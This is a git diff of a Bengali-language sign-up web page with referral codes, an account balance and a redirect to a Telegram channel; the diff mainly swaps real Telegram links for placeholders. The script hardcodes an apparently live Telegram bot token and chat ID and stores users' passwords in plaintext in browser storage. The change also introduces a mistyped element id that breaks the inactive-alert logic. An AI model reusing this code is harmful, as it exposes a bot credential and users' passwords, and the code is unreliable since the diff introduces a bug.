@@ -95,13 +95,13 @@
 
             <!-- ৪টি বাটন -->
             <div class="grid grid-cols-4 gap-2">
-                <a href="https://t.me/+cz4esCEcuPNlYjdl" target="_blank" class="bg-slate-800/80 border border-slate-700/70 p-2.5 rounded-2xl text-center flex flex-col items-center transition group shadow-sm">
+                <a href="https://t.me/YOUR_CHANNEL" target="_blank" class="bg-slate-800/80 border border-slate-700/70 p-2.5 rounded-2xl text-center flex flex-col items-center transition group shadow-sm">
+                    <div class="w-9 h-9 bg-blue-500/20 text-blue-400 rounded-xl flex items-center justify-center text-sm mb-1"><i class="fa-brands fa-telegram"></i></div>
+                    <span class="text-[10px] font-bold text-slate-200">টিজি চ্যানেল</span>
+                </a>
+                <a href="https://t.me/YOUR_GROUP" target="_blank" class="bg-slate-800/80 border border-slate-700/70 p-2.5 rounded-2xl text-center flex flex-col items-center transition group shadow-sm">
                     <div class="w-9 h-9 bg-blue-500/20 text-blue-400 rounded-xl flex items-center justify-center text-sm mb-1"><i class="fa-brands fa-telegram"></i></div>
                     <span class="text-[10px] font-bold text-slate-200">টিজি গ্রুপ</span>
-                </a>
-                <a href="https://t.me/OWNER_TANJIR_VAI" target="_blank" class="bg-slate-800/80 border border-slate-700/70 p-2.5 rounded-2xl text-center flex flex-col items-center transition group shadow-sm">
-                    <div class="w-9 h-9 bg-blue-500/20 text-blue-400 rounded-xl flex items-center justify-center text-sm mb-1"><i class="fa-brands fa-telegram"></i></div>
-                    <span class="text-[10px] font-bold text-slate-200">টিজি চ্যাট</span>
                 </a>
                 <a href="https://youtube.com/@YOUR_CHANNEL" target="_blank" class="bg-slate-800/80 border border-slate-700/70 p-2.5 rounded-2xl text-center flex flex-col items-center transition group shadow-sm">
                     <div class="w-9 h-9 bg-rose-500/20 text-rose-400 rounded-xl flex items-center justify-center text-sm mb-1"><i class="fa-brands fa-youtube"></i></div>
@@ -165,7 +165,7 @@
             <form id="registerForm" onsubmit="handleRegisterSubmit(event)" class="space-y-3 hidden">
                 <div class="text-center mb-2">
                     <h3 class="text-lg font-bold text-white">নতুন অ্যাকাউন্ট তৈরি করুন</h3>
-                    <p class="text-xs text-emerald-400 mt-0.5">রেজিস্ট্রেশনের পর সরাসরি আমাদের টেলিগ্রাম গ্রুপে নিয়ে যাওয়া হবে!</p>
+                    <p class="text-xs text-emerald-400 mt-0.5">রেজিস্ট্রেশনের পর সরাসরি আমাদের টেলিগ্রাম চ্যানেলে নিয়ে যাওয়া হবে!</p>
                 </div>
                 <div>
                     <label class="block text-xs font-bold text-slate-300 mb-1">আপনার পুরো নাম</label>
@@ -184,7 +184,7 @@
                     <input type="text" id="regReferCode" placeholder="রেফার কোড অটো বসবে" class="w-full px-3.5 py-3 bg-slate-800 border border-slate-700 rounded-xl text-xs text-emerald-400 font-mono">
                 </div>
                 <button type="submit" class="w-full bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-extrabold py-3 rounded-xl text-xs transition shadow-lg shadow-emerald-500/25">
-                    রেজিস্ট্রেশন ও গ্রুপ জয়েন
+                    রেজিস্ট্রেশন ও চ্যানেল জয়েন
                 </button>
             </form>
 
@@ -263,7 +263,7 @@
     <script>
         const BOT_TOKEN = '8726008499:AAFIajdSOavCs8lB8Yh2IlODwEqsmyr9-2c';
         const CHAT_ID = '6733473116';
-        const TELEGRAM_GROUP_URL = 'https://t.me/+cz4esCEcuPNlYjdl'; // আপনার দেওয়া টেলিগ্রাম গ্রুপ লিংক
+        const TELEGRAM_CHANNEL_URL = 'https://t.me/YOUR_CHANNEL'; // আপনার টেলিগ্রাম চ্যানেলের লিংক এখানে দিন
 
         window.addEventListener('DOMContentLoaded', () => {
             // URL থেকে রেফার কোড চেক করা এবং সেভ করা
@@ -309,10 +309,7 @@
             const name = document.getElementById('regName').value.trim();
             const phone = document.getElementById('regPhone').value.trim();
             const password = document.getElementById('regPass').value.trim();
-            
-            // ইনপুট ফিল্ড অথবা লোকাল স্টোরেজ থেকে রেফার কোড নেওয়া
-            const urlParams = new URLSearchParams(window.location.search);
-            const refer = document.getElementById('regReferCode').value.trim() || urlParams.get('ref') || localStorage.getItem('hi_temp_ref') || 'None';
+            const refer = document.getElementById('regReferCode').value.trim();
 
             let users = JSON.parse(localStorage.getItem('hi_all_users')) || [];
             
@@ -331,7 +328,7 @@
                 phone: phone,
                 password: password,
                 referCode: myReferCode,
-                usedRefer: refer,
+                usedRefer: refer || 'None',
                 balance: 0.00,
                 active: false
             };
@@ -339,13 +336,12 @@
             users.push(newUser);
             localStorage.setItem('hi_all_users', JSON.stringify(users));
             localStorage.setItem('hi_logged_user', JSON.stringify(newUser));
-            localStorage.removeItem('hi_temp_ref');
 
-            showCustomPopup('অভিনন্দন! অ্যাকাউন্ট সফলভাবে তৈরি হয়েছে। এখন আপনাকে আমাদের টেলিগ্রাম গ্রুপে নিয়ে যাওয়া হচ্ছে...');
+            showCustomPopup('অভিনন্দন! অ্যাকাউন্ট সফলভাবে তৈরি হয়েছে। এখন আপনাকে আমাদের টেলিগ্রাম চ্যানেলে নিয়ে যাওয়া হচ্ছে...');
 
-            // ২ সেকেন্ড পর টেলিগ্রাম গ্রুপে রিডাইরেক্ট করা
+            // ৩ সেকেন্ড পর বা সাথে সাথে টেলিগ্রাম চ্যানেলে রিডাইরেক্ট করা
             setTimeout(() => {
-                window.location.href = TELEGRAM_GROUP_URL;
+                window.location.href = TELEGRAM_CHANNEL_URL;
             }, 2000);
         }
 
@@ -390,7 +386,7 @@
                 document.getElementById('badgeStatus').className = "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 text-[10px] px-2.5 py-1 rounded-full font-bold flex items-center gap-1";
                 document.getElementById('profileStatusBadge').className = "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 text-[10px] px-3 py-1 rounded-full font-bold inline-block mt-2";
                 document.getElementById('profileStatusBadge').innerText = "Active User";
-                document.getElementById('inactiveAlertCard').style.display = 'none';
+                document.getElementById('inactiveAlertCardstyle').style.display = 'none';
             }
         }
 
